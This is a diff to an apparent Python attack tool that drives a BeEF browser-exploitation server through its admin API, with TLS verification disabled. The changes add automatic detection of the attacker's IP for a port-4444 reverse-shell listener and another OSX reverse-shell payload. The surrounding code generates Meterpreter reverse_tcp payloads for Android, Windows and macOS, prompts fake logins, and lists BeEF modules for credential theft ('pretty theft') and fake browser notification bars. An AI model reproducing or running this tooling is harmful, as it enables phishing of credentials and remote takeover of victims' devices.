@@ -1,4 +1,4 @@
-import sys, os, time, requests, signal, json, pprint, sqlite3
+import sys, os, time, requests, signal, json, pprint, sqlite3, socket
 from collections import MutableMapping
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -27,7 +27,7 @@ class Browser_Parser:
 		self.account = None
 		self.toolbar_prompt_id = None
 		self.interface = MITM_Interface(self.user_id)
-		self.lhost = "172.16.2.109"
+		self.lhost = self.get_my_ip()
 		self.lport = "4444"
 		self.menu()
 
@@ -37,6 +37,13 @@ class Browser_Parser:
 		k_une = requests.post(url="https://192.168.3.1:3000/api/admin/login", cert=self.cert, verify=False, json=to_beef_serv)
 		k_dict = json.loads(k_une.text)
 		return k_dict['token']
+
+	def get_my_ip(self):
+		ifconfig = [l for l in (
+			[ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1],
+			 [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], 
+			 	s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l]
+		return str(ifconfig[0][0])
 
 	def promt_fake_login(self):
 		#if self.login_promt_id is None: ./RAP.sh st
@@ -114,7 +121,8 @@ class Browser_Parser:
 
 	def make_meterpreter_payload(self, operating_system):
 		'''
-			android: android/meterpreter/reverse_tcp  
+			android: android/meterpreter/reverse_tcp 
+				   payload/osx/armle/shell_reverse_tcp  
 			windows : windows/meterpreter/reverse_tcp
 			mac : osx/x86/shell_reverse_tcp    
 		'''
@@ -257,7 +265,6 @@ class Browser_Parser:
 
 
 	def get_module_deets(self):
-		#debug: helper to get details on modules, delete after use
 		det = requests.get(url="https://192.168.3.1:3000/api/modules/266?token=" + str(self.api_key), cert=self.cert, verify=False)
 		pprint.pprint(json.loads(det.text)) 
 		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar
